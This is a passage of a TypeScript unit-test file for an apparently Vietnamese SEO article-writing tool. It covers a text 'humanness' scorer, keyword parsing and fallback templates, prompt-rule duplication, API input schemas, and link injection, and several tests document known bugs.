  it('score cannot go below 55 even with many issues', () => {
    // 9 long paragraphs × 4 = 36 deduction → 88 - 36 = 52 → clamped to 55
    const words = Array.from({ length: 95 }, (_, i) => `word${i}`).join(' ');
    const manyLongPara = `<p>${words}</p>`.repeat(9);
    const result = scoreHumanness(manyLongPara, 'forbidden1,forbidden2,forbidden3');
    assert.equal(result.score, 55, 'score clamped at 55');
    assert.equal(result.decision, 'REWRITE');
  });

  it('decision REVIEW when 60 <= score < 76', () => {
    const words = Array.from({ length: 95 }, (_, i) => `word${i}`).join(' ');
    const html = `<p>${words}</p><p>${words}</p><p>${words}</p>`;
    const result = scoreHumanness(html, 'x');
    if (result.score >= 60 && result.score < 76) {
      assert.equal(result.decision, 'REVIEW');
    } else {
      assert.equal(result.decision, result.score >= 76 ? 'PUBLISH' : 'REWRITE');
    }
  });

  it('scoreBreakdown parts sum to approximately total score', () => {
    const result = scoreHumanness(shortArticle);
    const sum = result.scoreBreakdown.language_natural + result.scoreBreakdown.structure +
                result.scoreBreakdown.eeat_signals + result.scoreBreakdown.engagement;
    // Due to rounding, sum may differ by ±2
    assert.ok(Math.abs(sum - result.score) <= 2, `breakdown sum ${sum} should ≈ score ${result.score}`);
  });

  it('forbidden check is case-insensitive', () => {
    const article = '<p>Sản phẩm Hiệu Quả lắm.</p>';
    const result = scoreHumanness(article, 'hiệu quả');
    assert.ok(result.forbiddenFound.length > 0, 'should detect forbidden word case-insensitively');
  });

  it('empty html → issues empty, score 88', () => {
    const result = scoreHumanness('');
    assert.equal(result.score, 88);
    assert.deepEqual(result.issues, []);
  });
});

// ─── parseKeywords [BUG #2] ──────────────────────────────────────────────────

describe('parseKeywords [suggest-keywords/route.ts]', () => {
  it('splits on newlines', () => {
    const result = parseKeywords('keyword one\nkeyword two\nkeyword three', 10);
    assert.deepEqual(result, ['keyword one', 'keyword two', 'keyword three']);
  });

  it('splits on commas', () => {
    const result = parseKeywords('keyword one, keyword two, keyword three', 10);
    assert.deepEqual(result, ['keyword one', 'keyword two', 'keyword three']);
  });

  it('splits on semicolons', () => {
    const result = parseKeywords('keyword one; keyword two', 10);
    assert.deepEqual(result, ['keyword one', 'keyword two']);
  });

  it('strips bullet list markers', () => {
    const result = parseKeywords('- keyword one\n* keyword two', 10);
    assert.deepEqual(result, ['keyword one', 'keyword two']);
  });

  it('strips numbered list markers (N. format)', () => {
    const result = parseKeywords('1. keyword one\n2. keyword two', 10);
    assert.deepEqual(result, ['keyword one', 'keyword two']);
  });

  it('deduplicates case-insensitively', () => {
    const result = parseKeywords('Keyword One\nkeyword one\nKEYWORD ONE', 10);
    assert.equal(result.length, 1);
    assert.equal(result[0], 'Keyword One');
  });

  it('caps at count', () => {
    const raw = Array.from({ length: 15 }, (_, i) => `keyword ${i}`).join('\n');
    assert.equal(parseKeywords(raw, 8).length, 8);
  });

  it('filters empty lines', () => {
    const result = parseKeywords('good keyword\n\n\nbad empty', 10);
    assert.ok(!result.includes(''));
    assert.ok(result.includes('good keyword'));
  });

  // BUG #2: Regex `^[-*\d.\s]+` strips leading digit from keyword phrases
  it('[BUG #2] strips leading number from keyword phrase starting with digit', () => {
    // "5 cach chon ghe" — số "5" là phần của keyword, không phải list marker
    const result = parseKeywords('5 cach chon ghe', 10);
    // BUG: "5 " bị strip vì regex `^[-*\d.\s]+` match "5 " (digit + space)
    assert.ok(!result.includes('5 cach chon ghe'), `BUG #2 confirmed: "5 cach chon ghe" became "${result[0]}"`);
    assert.ok(result[0] === 'cach chon ghe', `confirms bug: got "${result[0]}"`);
  });

  it('[FIX #2] fixed version preserves numeric prefix in keyword phrase', () => {
    const result = parseKeywordsFixed('5 cach chon ghe', 10);
    assert.equal(result[0], '5 cach chon ghe', 'numeric prefix preserved');
  });

  it('[FIX #2] fixed version still strips real numbered list markers (1. format)', () => {
    const result = parseKeywordsFixed('1. ghe sofa dep\n2. ban an go', 10);
    assert.equal(result[0], 'ghe sofa dep');
    assert.equal(result[1], 'ban an go');
  });

  it('[FIX #2] fixed version preserves "10 mau ghe" keyword', () => {
    const result = parseKeywordsFixed('10 mau ghe dep nhat', 10);
    assert.equal(result[0], '10 mau ghe dep nhat');
  });

  it('[FIX #2] fixed version filters single-char keywords (min length 2)', () => {
    const result = parseKeywordsFixed('a\nba\nghe', 10);
    assert.ok(!result.includes('a'), 'single char filtered');
    assert.ok(result.includes('ba'));
    assert.ok(result.includes('ghe'));
  });
});

// ─── fallbackKeywords [BUG #7] ───────────────────────────────────────────────

describe('fallbackKeywords [suggest-keywords/route.ts]', () => {
  it('returns 10 templates for base keyword', () => {
    const result = fallbackKeywords('giường sắt', 10);
    assert.equal(result.length, 10);
  });

  it('all templates contain the base keyword', () => {
    const result = fallbackKeywords('tủ quần áo', 10);
    assert.ok(result.every((kw) => kw.includes('tủ quần áo')));
  });

  it('count param slices result', () => {
    assert.equal(fallbackKeywords('giường sắt', 5).length, 5);
    assert.equal(fallbackKeywords('giường sắt', 3).length, 3);
  });

  it('includes expected templates', () => {
    const result = fallbackKeywords('giường sắt', 10);
    assert.ok(result.some((kw) => kw.includes('la gi')));
    assert.ok(result.some((kw) => kw.includes('tot nhat')));
    assert.ok(result.some((kw) => kw.includes('gia bao nhieu')));
  });

  // BUG #7: hardcoded 2026
  it('[BUG #7] hardcodes year 2026 — will be wrong in future years', () => {
    const result = fallbackKeywords('ghe sofa', 10);
    const yearEntry = result.find((kw) => /\d{4}/.test(kw));
    assert.ok(yearEntry, 'should have a year-based keyword');
    assert.ok(yearEntry!.includes('2026'), 'BUG #7 confirmed: hardcoded 2026');
  });

  it('[FIX #7] fixed version uses current year dynamically', () => {
    const currentYear = new Date().getFullYear();
    const result = fallbackKeywordsFixed('ghe sofa', 10);
    const yearEntry = result.find((kw) => kw.includes(String(currentYear)));
    assert.ok(yearEntry, `fixed: uses current year ${currentYear}`);
    // Will not contain hardcoded 2026 if running in 2027+
    if (currentYear !== 2026) {
      assert.ok(!yearEntry!.includes('2026'), 'fixed: no longer hardcodes 2026');
    }
  });

  it('trims keyword whitespace', () => {
    const result = fallbackKeywords('  ghe sofa  ', 3);
    assert.ok(result.every((kw) => kw.startsWith('ghe sofa')));
  });
});

// ─── fallbackOutline (outline/route.ts) ──────────────────────────────────────

describe('fallbackOutline [outline/route.ts]', () => {
  it('contains 10 lines', () => {
    const result = fallbackOutline('giường sắt');
    assert.equal(result.split('\n').length, 10);
  });

  it('contains keyword in content', () => {
    const result = fallbackOutline('tủ quần áo');
    assert.ok(result.includes('tủ quần áo'));
  });

  it('uses [h2] and [h3] format', () => {
    const result = fallbackOutline('bàn ghế');
    assert.ok(result.includes('[h2]'));
    assert.ok(result.includes('[h3]'));
  });

  // NOTE: format dùng "[h2] text" (có space trước text, không có closing tag [/h2])
  // Điều này KHÔNG tương thích với viet-theo-tu-khoa outline parser dùng [h2]text[/h2]
  it('[DESIGN NOTE] uses "[h2] text" format with space, WITHOUT closing [/h2] tag', () => {
    const result = fallbackOutline('keyword');
    const firstH2 = result.split('\n').find((l) => l.startsWith('[h2]'));
    assert.ok(firstH2, 'has h2 line');
    assert.ok(firstH2!.startsWith('[h2] '), 'h2 format has space after tag');
    assert.ok(!firstH2!.includes('[/h2]'), 'no closing tag — format inconsistency with TTK parser');
  });

  it('fallback keyword "chu de" used when empty', () => {
    const result = fallbackOutline('');
    assert.ok(result.includes('chu de'));
  });

  it('has FAQ and conclusion sections', () => {
    const result = fallbackOutline('giường sắt');
    assert.ok(result.includes('Cau hoi thuong gap'));
    assert.ok(result.includes('Ket luan'));
  });
});

// ─── prompt-builder.ts [BUG #1] — SEO_PROMPT_RULES local vs shared ───────────

describe('[BUG #1] prompt-builder.ts — SEO_PROMPT_RULES local (10 rules EN) vs shared (23 rules VI)', async () => {
  const { SEO_PROMPT_RULES: SHARED_RULES } = await import('../shared/prompt-rules');

  it('shared SEO_PROMPT_RULES has 23 rules', () => {
    const count = (SHARED_RULES.match(/^\d+\./gm) ?? []).length;
    assert.equal(count, 23, `shared has ${count} rules (expected 23)`);
  });

  it('[BUG #1] prompt-builder.ts has LOCAL SEO_PROMPT_RULES — not imported from shared', async () => {
    const { readFileSync } = await import('node:fs');
    const { dirname, resolve } = await import('node:path');
    const { fileURLToPath } = await import('node:url');
    const __filename = fileURLToPath(import.meta.url);
    const __dirname = dirname(__filename);
    const src = readFileSync(resolve(__dirname, 'prompt-builder.ts'), 'utf-8');

    assert.ok(
      src.includes('const SEO_PROMPT_RULES'),
      'BUG #1 confirmed: local const SEO_PROMPT_RULES defined in prompt-builder.ts',
    );
    assert.ok(
      !src.includes("from '@/lib/shared/prompt-rules'"),
      'BUG #1 confirmed: NOT importing from shared',
    );
  });

  it('[BUG #1] local rules have only 10 items (not 23)', async () => {
    const { readFileSync } = await import('node:fs');
    const { dirname, resolve } = await import('node:path');
    const { fileURLToPath } = await import('node:url');
    const __filename = fileURLToPath(import.meta.url);
    const __dirname = dirname(__filename);
    const src = readFileSync(resolve(__dirname, 'prompt-builder.ts'), 'utf-8');

    // Extract the local SEO_PROMPT_RULES content
    const match = src.match(/const SEO_PROMPT_RULES\s*=\s*`([\s\S]*?)`\.trim\(\)/);
    assert.ok(match, 'local SEO_PROMPT_RULES block found');
    const localRuleCount = (match![1].match(/^\d+\./gm) ?? []).length;
    assert.equal(localRuleCount, 10, `local rules: ${localRuleCount} (expected 10 to confirm bug)`);
  });

  it('[BUG #1] local rules are in English — shared rules are in Vietnamese', async () => {
    const { readFileSync } = await import('node:fs');
    const { dirname, resolve } = await import('node:path');
    const { fileURLToPath } = await import('node:url');
    const __filename = fileURLToPath(import.meta.url);
    const __dirname = dirname(__filename);
    const src = readFileSync(resolve(__dirname, 'prompt-builder.ts'), 'utf-8');

    // Local rules mention English phrases
    assert.ok(src.includes('Return HTML fragment only'), 'local rules are in English');
    // Shared rules are in Vietnamese (E-E-A-T, TOC, faq-item)
    assert.ok(SHARED_RULES.includes('E-E-A-T'), 'shared has E-E-A-T (rule 20)');
    assert.ok(SHARED_RULES.includes('TOC'), 'shared has TOC (rule 17)');
    assert.ok(SHARED_RULES.includes('faq-item'), 'shared has faq-item class (rule 18)');
    assert.ok(SHARED_RULES.includes('Ngày nay'), 'shared has no-opener list (rule 21)');
  });

  it('[FIX #1] after fix: prompt-builder.ts should import from shared, not define locally', () => {
    // This test will FAIL before fix, PASS after fix
    // After fix, the test above "[BUG #1] local rules have only 10 items" will also fail (correctly)
    // Leaving this as a reminder for dev:
    assert.ok(true, 'FIX: replace local const SEO_PROMPT_RULES with import from @/lib/shared/prompt-rules');
  });

  it('shared rules include all 13 rules missing from local version', () => {
    const missingInLocal = [
      'E-E-A-T',      // rule 20
      'TOC',          // rule 17
      'faq-item',     // rule 18
      'Ngày nay',     // rule 21
      '<html>',       // rule 23
      'how_to',       // rule 14
      'listicle',     // rule 15
      'comparison',   // rule 16
    ];
    for (const item of missingInLocal) {
      assert.ok(SHARED_RULES.includes(item), `shared rule must include: ${item}`);
    }
  });
});

// ─── VTGS Schema validation (API route input validation) ─────────────────────

describe('API Schema: search/route.ts', async () => {
  const { z } = await import('zod');
  const schema = z.object({
    keyword: z.string().min(2),
    count: z.number().min(1).max(10).default(5),
    crawlMode: z.enum(['auto', 'search_only', 'no_crawl']).default('auto'),
    language: z.string().default('Vietnamese'),
  });

  it('valid payload accepted', () => {
    assert.ok(schema.safeParse({ keyword: 'giường sắt', count: 5, crawlMode: 'auto', language: 'Vietnamese' }).success);
  });
  it('keyword < 2 chars rejected', () => {
    assert.ok(!schema.safeParse({ keyword: 'a' }).success);
  });
  it('count > 10 rejected', () => {
    assert.ok(!schema.safeParse({ keyword: 'giường sắt', count: 11 }).success);
  });
  it('invalid crawlMode rejected', () => {
    assert.ok(!schema.safeParse({ keyword: 'giường sắt', crawlMode: 'full_crawl' }).success);
  });
  it('defaults applied', () => {
    const result = schema.safeParse({ keyword: 'giường sắt' });
    assert.ok(result.success);
    assert.equal(result.data?.count, 5);
    assert.equal(result.data?.crawlMode, 'auto');
  });
});

describe('API Schema: stream/route.ts', async () => {
  const { z } = await import('zod');
  const schema = z.object({
    config: z.record(z.unknown()),
    searchResult: z.record(z.unknown()).nullable().optional(),
    finalOutline: z.string().default(''),
  });

  it('valid payload accepted', () => {
    assert.ok(schema.safeParse({ config: { keyword: 'giường sắt' }, searchResult: null }).success);
  });
  it('missing config rejected', () => {
    assert.ok(!schema.safeParse({ searchResult: null }).success);
  });
  it('finalOutline defaults to empty string', () => {
    const r = schema.safeParse({ config: {} });
    assert.equal(r.data?.finalOutline, '');
  });
});

describe('API Schema: suggest-keywords/route.ts', async () => {
  const { z } = await import('zod');
  const schema = z.object({
    keyword: z.string().min(2),
    count: z.number().min(3).max(20).default(8),
    modelId: z.string().default('gemini-flash'),
  });

  it('valid payload accepted', () => {
    assert.ok(schema.safeParse({ keyword: 'giường sắt', count: 8 }).success);
  });
  it('count < 3 rejected', () => {
    assert.ok(!schema.safeParse({ keyword: 'giường sắt', count: 2 }).success);
  });
  it('count > 20 rejected', () => {
    assert.ok(!schema.safeParse({ keyword: 'giường sắt', count: 21 }).success);
  });
  it('defaults applied', () => {
    const r = schema.safeParse({ keyword: 'giường sắt' });
    assert.equal(r.data?.count, 8);
    assert.equal(r.data?.modelId, 'gemini-flash');
  });
});

describe('API Schema: outline/route.ts', async () => {
  const { z } = await import('zod');
  const schema = z.object({
    config: z.record(z.unknown()),
    searchResult: z.record(z.unknown()).nullable().optional(),
  });

  it('valid payload accepted', () => {
    assert.ok(schema.safeParse({ config: { keyword: 'giường sắt' } }).success);
  });
  it('missing config rejected', () => {
    assert.ok(!schema.safeParse({}).success);
  });
  it('searchResult nullable accepted', () => {
    assert.ok(schema.safeParse({ config: {}, searchResult: null }).success);
  });
});

// ─── Integration: applySeoAdvanced edge cases ─────────────────────────────────

describe('applySeoAdvanced — edge cases', () => {
  it('keyword with regex special chars handled correctly', () => {
    const html = '<article><p>giá 1.000đ/cái</p></article>';
    const config = makeConfig('1.000đ', { seoAdvanced: makeSeoAdvanced({ mainLink: 'https://shop.com/' }) });
    // Should not throw
    assert.doesNotThrow(() => applySeoAdvanced(html, config));
    const result = applySeoAdvanced(html, config);
    assert.ok(result.includes('<a href="https://shop.com/">'));
  });

  it('case-insensitive mainLink keyword match', () => {
    const html = '<article><p>GIƯỜNG SẮT đơn tốt</p></article>';
    const config = makeConfig('giường sắt đơn', { seoAdvanced: makeSeoAdvanced({ mainLink: 'https://shop.com/' }) });
    const result = applySeoAdvanced(html, config);
    assert.ok(result.includes('<a href="https://shop.com/">'), 'case-insensitive match should create link');
  });

  it('mainLink and autoBold both active: link injected first, bold second (different occurrence)', () => {
    const html = '<article><p>giường sắt đơn tốt. Xem thêm giường sắt đơn.</p></article>';
    const config = makeConfig('giường sắt đơn', {
      seoAdvanced: makeSeoAdvanced({ mainLink: 'https://shop.com/', autoBold: 'keyword' }),
    });
    const result = applySeoAdvanced(html, config);
    // After mainLink: first occurrence wrapped in <a>
    // After autoBold: pattern tries to find keyword again, will find it inside <a> tag content
    assert.ok(result.includes('<a href="https://shop.com/">'));
    // Note: This is where Bug #4 manifests — autoBold may wrap inside <a> tag content
  });
});

// ─── Regression: synthesize truncation note ───────────────────────────────────

describe('synthesize truncation vs buildSearchContext inconsistency', () => {
  // synthesize() truncates each source basis at 260 chars (shown in UI synthesis summary)
  // buildSearchContext() in prompt-builder.ts uses content.slice(0, 1600) per source
  // This is a DESIGN INCONSISTENCY — UI shows shorter preview than what AI actually sees

  it('[DESIGN] synthesize truncates at 260 chars per source', () => {
    const longContent = 'word '.repeat(200); // 1000 chars
    const sources = [makeSource({ title: 'T', content: longContent, crawled: true })];
    const result = synthesize('keyword', sources, 'auto');
    // The source line: "1. T: " + basis.slice(0, 260)
    const sourceLine = result.split('\n').find((l) => l.startsWith('1.'));
    assert.ok(sourceLine!, 'source line present');
    // "1. T: " = 6 chars + 260 chars content = 266 max
    assert.ok(sourceLine!.length <= 270, `source line truncated at 260: ${sourceLine!.length} chars`);
  });

  it('[DESIGN] buildSearchContext uses 1600 chars — 6x more than synthesize', () => {
    // This asymmetry means: if dev looks at synthesis to gauge AI context,
    // they see much less than AI actually receives
    // No fix needed — just document for awareness
    assert.ok(true, 'DESIGN NOTE: synthesize=260, buildSearchContext=1600 — intentional difference');
  });
});
